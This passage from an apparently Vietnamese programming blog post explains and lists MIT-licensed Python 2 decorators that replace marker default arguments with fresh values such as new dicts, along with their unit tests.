&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Điểm khác biệt chính là ở việc sử dụng bộ trang hoàng &lt;strong&gt;callable_auto_argument&lt;/strong&gt; để tự động thay thế tham số &lt;strong&gt;arg_2&lt;/strong&gt; với giá trị trả về từ lệnh gọi &lt;strong&gt;dict()&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Bộ trang hoàng &lt;strong&gt;auto_argument&lt;/strong&gt; (lớp cha của &lt;strong&gt;callable_auto_argument&lt;/strong&gt;) nhận một dãy các bộ 3 (tên tham số, giá trị dấu, giá trị thay thế) (argument name, marker, value). Khi tham số có giá trị là &lt;strong&gt;giá trị dấu&lt;/strong&gt; thì giá trị của tham số sẽ được thay bằng giá trị tạo ra từ &lt;strong&gt;giá trị thay thế&lt;/strong&gt;. &lt;strong&gt;callable_auto_argument&lt;/strong&gt; tạo ra giá trị thay thế bằng cách gọi hàm giá trị thay thế. Người dùng cũng có thể tạo lớp con của các bộ trang hoàng này để tùy chỉnh giá trị thay thế riêng hoặc tránh phải lập lại giá trị dấu. Xem qua hàm &lt;strong&gt;test_subclass&lt;/strong&gt; và lớp &lt;strong&gt;auto_dict_argument&lt;/strong&gt; trong mã nguồn.&lt;/p&gt;
&lt;p&gt;Mã nguồn của các bộ trang hoàng này được liệt kê ở ngay dưới. Mã nguồn này được cung cấp theo điều khoản bản quyền &lt;strong&gt;MIT&lt;/strong&gt;. Người dùng có thể tùy ý sử dụng, hay sửa đổi mã nguồn cho hợp với nhu cầu.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Automatically replace a default argument with some other (potentially&lt;/span&gt;
&lt;span class="sd"&gt;dynamic) value.&lt;/span&gt;

&lt;span class="sd"&gt;The default argument is usually guarded like this::&lt;/span&gt;

&lt;span class="sd"&gt;  def func(arg=None):&lt;/span&gt;
&lt;span class="sd"&gt;      if arg is None:&lt;/span&gt;
&lt;span class="sd"&gt;          arg = dict()&lt;/span&gt;
&lt;span class="sd"&gt;      // use arg&lt;/span&gt;

&lt;span class="sd"&gt;With decorators provided in this module, one can write::&lt;/span&gt;

&lt;span class="sd"&gt;  __marker = object()&lt;/span&gt;

&lt;span class="sd"&gt;  @callable_auto_argument([(&amp;#39;arg&amp;#39;, __marker, dict)])&lt;/span&gt;
&lt;span class="sd"&gt;  def func(arg=__marker):&lt;/span&gt;
&lt;span class="sd"&gt;      // use arg&lt;/span&gt;

&lt;span class="sd"&gt;See class:`callable_auto_argument`.&lt;/span&gt;

&lt;span class="sd"&gt;Also, the standard Python behavior could be thought as::&lt;/span&gt;

&lt;span class="sd"&gt;  __marker = object()&lt;/span&gt;

&lt;span class="sd"&gt;  @passthru_auto_argument([(&amp;#39;arg&amp;#39;, __marker, {})])&lt;/span&gt;
&lt;span class="sd"&gt;  def func(arg=__marker):&lt;/span&gt;
&lt;span class="sd"&gt;      // ...&lt;/span&gt;

&lt;span class="sd"&gt;See class:`passthru_auto_argument`.&lt;/span&gt;

&lt;span class="sd"&gt;These classes can be used by themselves or serve as base classes for more&lt;/span&gt;
&lt;span class="sd"&gt;customizations. For example, to eliminate repeated typings, one can subclass&lt;/span&gt;
&lt;span class="sd"&gt;``callable_auto_argument`` like this::&lt;/span&gt;

&lt;span class="sd"&gt;  class auto_dict_argument(callable_auto_argument):&lt;/span&gt;

&lt;span class="sd"&gt;      def __init__(self, *names):&lt;/span&gt;
&lt;span class="sd"&gt;          names_markers_values = []&lt;/span&gt;
&lt;span class="sd"&gt;          for name in names:&lt;/span&gt;
&lt;span class="sd"&gt;              names_markers_values.append((name, None, dict))&lt;/span&gt;
&lt;span class="sd"&gt;          super(auto_dict_argument, self).__init__(names_markers_values)&lt;/span&gt;

&lt;span class="sd"&gt;And then apply this on methods like this::&lt;/span&gt;

&lt;span class="sd"&gt;  @auto_dict_argument(&amp;#39;arg_1&amp;#39;, &amp;#39;arg_2&amp;#39;, &amp;#39;arg_3&amp;#39;)&lt;/span&gt;
&lt;span class="sd"&gt;  def method(arg_1=None, arg_2=None, arg_3=None):&lt;/span&gt;
&lt;span class="sd"&gt;      # arg_1, arg_2, arg_3 are new dicts unless specified otherwise&lt;/span&gt;
&lt;span class="sd"&gt;      # and these lines are no longer required&lt;/span&gt;
&lt;span class="sd"&gt;      # if arg_1 is None: arg_1 = {}&lt;/span&gt;
&lt;span class="sd"&gt;      # if arg_2 is None: arg_2 = {}&lt;/span&gt;
&lt;span class="sd"&gt;      # if arg_3 is None: arg_3 = {}&lt;/span&gt;

&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;


&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;unittest&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;auto_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;The base class for automatic argument.&lt;/span&gt;

&lt;span class="sd"&gt;    Subclasses must implement method:`create` to create appropriate value for&lt;/span&gt;
&lt;span class="sd"&gt;    the argument.&lt;/span&gt;

&lt;span class="sd"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;names_markers_values&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Construct an auto argument decorator with a collection of variable&lt;/span&gt;
&lt;span class="sd"&gt;        names, their markers, and their supposed values.&lt;/span&gt;

&lt;span class="sd"&gt;        The __supposed__ value objects are used in method:`create` to produce&lt;/span&gt;
&lt;span class="sd"&gt;        final value.&lt;/span&gt;

&lt;span class="sd"&gt;        Args:&lt;/span&gt;

&lt;span class="sd"&gt;            names_markers_values (collection of 3-tuples): A collection of&lt;/span&gt;
&lt;span class="sd"&gt;                (string, object, object) tuples specifying (in that order) the&lt;/span&gt;
&lt;span class="sd"&gt;                names, the marker objects, and the supposed value objects&lt;/span&gt;

&lt;span class="sd"&gt;        &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;names_markers_values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;names_markers_values&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;current_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Return a value based for the named argument and its current value.&lt;/span&gt;

&lt;span class="sd"&gt;        This final value will be used to replace what is currently passed in&lt;/span&gt;
&lt;span class="sd"&gt;        the invocation.&lt;/span&gt;

&lt;span class="sd"&gt;        Subclasses MUST override this method to provide more meaningful&lt;/span&gt;
&lt;span class="sd"&gt;        behavior.&lt;/span&gt;

&lt;span class="sd"&gt;        Args:&lt;/span&gt;

&lt;span class="sd"&gt;            name (string): The argument&amp;#39;s name&lt;/span&gt;
&lt;span class="sd"&gt;            current_value: Its current value in this invocation&lt;/span&gt;
&lt;span class="sd"&gt;            value: The supposed value passed in during construction time&lt;/span&gt;

&lt;span class="sd"&gt;        Returns:&lt;/span&gt;

&lt;span class="sd"&gt;            Final value for this argument&lt;/span&gt;

&lt;span class="sd"&gt;        &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;NotImplementedError&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__call__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;orig_func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;new_func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;names_markers_values&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="c1"&gt;# check kw_args first&lt;/span&gt;
                &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;KeyError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="c1"&gt;# ignored&lt;/span&gt;
                    &lt;span class="k"&gt;pass&lt;/span&gt;
                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="k"&gt;continue&lt;/span&gt;

                &lt;span class="c1"&gt;# then check args&lt;/span&gt;
                &lt;span class="c1"&gt;# we need to instropect the arg names from orig_func&lt;/span&gt;
                &lt;span class="n"&gt;co_obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;orig_func&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt;
                &lt;span class="c1"&gt;# number of required arguments&lt;/span&gt;
                &lt;span class="n"&gt;nr_required&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;co_obj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;co_argcount&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;
                               &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;orig_func&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_defaults&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nr_required&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;co_obj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;co_argcount&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;co_obj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;co_varnames&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="k"&gt;continue&lt;/span&gt;
                    &lt;span class="c1"&gt;# is it supplied in args?&lt;/span&gt;
                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;tuple&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                                &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                            &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                    &lt;span class="c1"&gt;# it is not, so, check defaults&lt;/span&gt;
                    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="n"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;orig_func&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_defaults&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;nr_required&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                            &lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="c1"&gt;# invoke orig_func with new args&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;orig_func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kw_args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;new_func&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;callable_auto_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;auto_argument&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;current_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;# call on value&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;passthru_auto_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;auto_argument&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;current_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;# just return it directly&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;AutoArgumentTest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unittest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TestCase&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_keyword_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="n"&gt;marker&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;replace_me&amp;#39;&lt;/span&gt;

        &lt;span class="nd"&gt;@passthru_auto_argument&lt;/span&gt;&lt;span class="p"&gt;([(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;arg_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;arg_name&lt;/span&gt;

        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

        &lt;span class="nd"&gt;@passthru_auto_argument&lt;/span&gt;&lt;span class="p"&gt;([(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;arg_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;replace_me&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;replace_me&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_name&lt;/span&gt;

        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                         &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                         &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
